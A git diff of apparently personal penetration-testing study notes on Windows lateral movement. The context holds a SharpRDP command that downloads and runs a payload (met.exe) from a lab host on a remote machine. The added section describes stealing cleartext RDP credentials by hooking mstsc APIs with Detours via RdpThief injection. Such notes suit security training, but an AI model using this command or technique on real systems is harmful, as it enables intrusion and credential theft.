@@ -109,3 +109,18 @@ library exposes interfaces to both scripts and compiled code through COM objects
 ```
 C:\Tools> sharprdp.exe computername=appsrv01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/met.exe', 'C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=corp1\dave password=lab
 ```
+#### Steal Credentials from RDP
+
+We can modify APIs and redirect execution to custom code. we could overwrite the initial instructions of an API at the assembly level with code that transfers
+execution to any custom code we want. The Microsoft-provided unmanaged (Detours library)[https://github.com/microsoft/Detours/wiki/Using-Detours] makes this possible.
+
+Our goal is to leverage API hooking to steal the clear text credentials entered into mstsc when
+they are processed by relevant APIs. APIs responsible for handling
+the username, password, and domain are CredIsMarshaledCredentialW, CryptProtectMemory,
+and SspiPrepareForCredRead.
+
+As a result of this research, MDSec released [RdpThief](https://github.com/0x09AL/RdpThief), which uses Detours to hook these APIs.
+The hooks in this tool will execute code that copies the username, password, and domain to a file.
+Finally, RdpThief allows the original code execution to continue as intended.
+
+We can create a c# script, [rdpinject.cs](/11WindowsLateralMovement/rdpinject.cs) to search all the mstsc,rdp process, then inject Rdpthief.dll into the code, execute our code ,get password/username and resume program execution. 
